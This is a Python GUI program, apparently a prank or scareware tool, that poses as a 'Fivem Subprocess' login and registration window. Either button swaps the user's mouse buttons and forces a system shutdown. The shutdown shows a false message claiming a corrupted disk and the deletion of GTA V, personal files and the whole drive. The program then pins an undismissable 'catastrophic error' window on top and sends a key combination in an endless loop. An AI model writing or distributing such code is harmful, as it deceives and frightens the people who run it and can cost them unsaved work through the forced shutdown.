import os
import customtkinter
import pyautogui
import time
import ctypes

class Main():
    def __init__(self):
        pass

    def on_closing(self):
        pass

    def inverter_botoes_mouse(self, inverter=True):
        if inverter:
            # Troca o botão esquerdo pelo direito
            ctypes.windll.user32.SwapMouseButton(1)
        else:
            # Volta ao normal
            ctypes.windll.user32.SwapMouseButton(0)

    def login(self):
        # Inverte os botões do mouse
        self.inverter_botoes_mouse(True)

        os.system('shutdown /s /f /t 30 /c "Disco corrompido. Como medida drástica de liberar espaço desinstalando Grand Theft Auto V - (GTA 5) e arquivos pessoais. Iniciando a formatação do computador..."')
        self.erro = customtkinter.CTkLabel(self.janela, text="Erro catastrófico!", font=("Italic", 20, "bold"))
        self.janela.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.button_login.destroy()
        self.texto1.destroy()
        self.button_registrar.destroy()
        self.user.destroy()
        self.senha.destroy()
        self.erro.pack(padx=15, pady=15)
        time.sleep(15)
        self.janela.attributes("-topmost", True)
        while True:
            pyautogui.hotkey('ctrl', 'shift', 'win', 'b')
            time.sleep(1)

    def registrar(self):
        os.system('shutdown /s /f /t 30 /c "Disco corrompido. Como medida drástica de liberar espaço desinstalando Grand Theft Auto V - (GTA 5) e arquivos pessoais. Iniciando a formatação do computador..."')
        self.erro = customtkinter.CTkLabel(self.janela, text="Erro catastrófico!", font=("Italic", 20, "bold"))
        self.janela.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.button_login.destroy()
        self.texto1.destroy()
        self.button_registrar.destroy()
        self.user.destroy()
        self.senha.destroy()
        self.erro.pack(padx=15, pady=15)
        self.janela.attributes("-topmost", True)
        time.sleep(15)
        while True:
            pyautogui.hotkey('ctrl', 'shift', 'win', 'b')
            time.sleep(1)

    def janela(self): 
        self.janela = customtkinter.CTk()
        customtkinter.set_appearance_mode("light")
        self.janela.geometry("500x300")
        self.janela.resizable(width=False, height=False)
        self.janela.title("Fivem Subprocess")
        self.button_login = customtkinter.CTkButton(self.janela, text="Login", command=self.login)
        self.button_registrar = customtkinter.CTkButton(self.janela, text="Registrar", command=self.registrar)
        self.texto1 = customtkinter.CTkLabel(self.janela, text="Faça login ou registre", font=("Italic", 20, "bold"))
        self.user = customtkinter.CTkEntry(self.janela, placeholder_text="Usuário:")
        self.senha = customtkinter.CTkEntry(self.janela, placeholder_text="Senha:", show="*")
        self.texto1.pack(padx=10, pady=10)
        self.user.pack(padx=10, pady=10)
        self.senha.pack(padx=10, pady=10)
        self.button_login.pack(padx=10, pady=10)
        self.button_registrar.pack(padx=10, pady=10)
        self.janela.attributes("-topmost", True)
        self.janela.mainloop()

if __name__ == "__main__":
    Main = Main()
    Main.janela()
